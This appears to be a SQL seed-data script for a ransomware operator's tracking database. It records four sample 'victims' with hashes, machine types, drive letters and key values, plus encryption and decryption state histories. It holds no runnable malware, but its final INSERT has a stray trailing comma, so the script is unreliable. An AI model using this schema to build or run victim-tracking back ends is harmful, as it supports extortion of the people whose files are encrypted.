INSERT INTO victims(id_victim, hash, os, disks, key ) values (1,
     '7F8450550806FDD46F70E307A016CFEE9EC7CF8768E5F0C20EA0382FF3D0324FA38B96691405BEC2624CC2CE75216604A2DC6E590B99C719
     5EABDA6FDFE0CD1DD87C58832011FCFA0EA5F58B004F69B4ACC36740975BE22A06BD8C21323899524398FF835575F6636572DE0D55AD49E2
     34C0B7E7E2443E895EF60AB3DC7F6FA3',
     'WORKSTATION', 'c:,e:,f:', 108);
INSERT INTO victims (id_victim, hash, os, disks, key) values (2,
     '61AA1B2E9331A6AA453E3CA5C6648573C025F12C57B66D4152BA033096DBA834122BFB300CB61A60411EB9545436CEF23B25C3596208C613
     C3457B8BAE26A93999E71F5858D8D55984F16937C48F705FE2A3E985AE091352F0C8A612C548F68F77BDD3B2474BC6591B181516CCD8626C
     C4C80A47B3292EBE47B48A3E790330D9',
     'SERVEUR', 'c:,e:', 23);
INSERT INTO victims (id_victim, hash, os, disks, key) values (3,
     '8873B1F65C614B63CC60381CC0FBFB62E37D8E53462A5B5F56FFD8D1C1936B7DF2092BAB6A404FFE505A9E77CF691B9EF9B1203BC907A2E4
     AA34F7829693D5F9F9D2918CE46D223F14B1B204DE7BFA3EB6E6C7BB011D28666B21BFD0C77BA2A1970AF51E16365485815B204154426960
     543ADD142E45DAE9AF74D6260343C670',
     'WORKSTATION', 'c:,f:', 0);
INSERT INTO victims (id_victim, hash, os, disks, key) values (4,
     '589F8453D6AC610ABD40CC94DD7FA0FCFACD1801D46C57C89F9FD039F56B52B9FC090A4C702A9E10A1A3355409A017961F8D4EBD8FFFB53D
     D893B4B60D97E1492FAB313A4FD6050F016C173596CC0D4D9899267BD7DA147BC9B86A2C2250FC855C651FA34C4457F8BEC66E7D92135802
     26876B24DB25CE1C2C08ECEE96BD64EF',
     'WORKSTATION', 'c:,f:,y:,z:', 108);


INSERT INTO states values
(1, 1, '1614356410', 'INITIALIZE'),
(2, 1, '1614356420', 'CRYPT'),
(3, 1, '1614356430', 'PENDING'),
(4, 1, '1614356760', 'DECRYPT'),
(5, 1, '1614356990', 'DECRYPT'),
(6, 2, '1614356410', 'INITIALIZE'),
(7, 2, '1614356420', 'CRYPT'),
(8, 2, '1614356430', 'PENDING'),
(9, 2, '1614356760', 'DECRYPT'),
(10, 2, '1614356990', 'DECRYPT'),
(11, 3, '1614356410', 'INITIALIZE'),
(12, 3, '1614356420', 'CRYPT'),
(13, 3, '1614356430', 'PENDING'),
(14, 3, '1614356760', 'DECRYPT'),
(15, 3, '1614356990', 'DECRYPT'),
(16, 4, '1614356410', 'INITIALIZE'),
(17, 4, '1614356420', 'CRYPT'),
(18, 4, '1614356430', 'PENDING'),
(19, 4, '1614356760', 'DECRYPT'),
(20, 4, '1614356990', 'DECRYPT');

INSERT INTO encrypted values
(1, 1, '1614356410', 0),
(2, 2, '1614356410', 0),
(3, 3, '1614356410', 0),
(4, 4, '1614356410', 0);

INSERT INTO decrypted values
(1, 1, '1614356430', 108),
(2, 2, '1614356760', 23),
(3, 3, '0', 0),
(4, 4, '1614356990', 108),

COMMIT;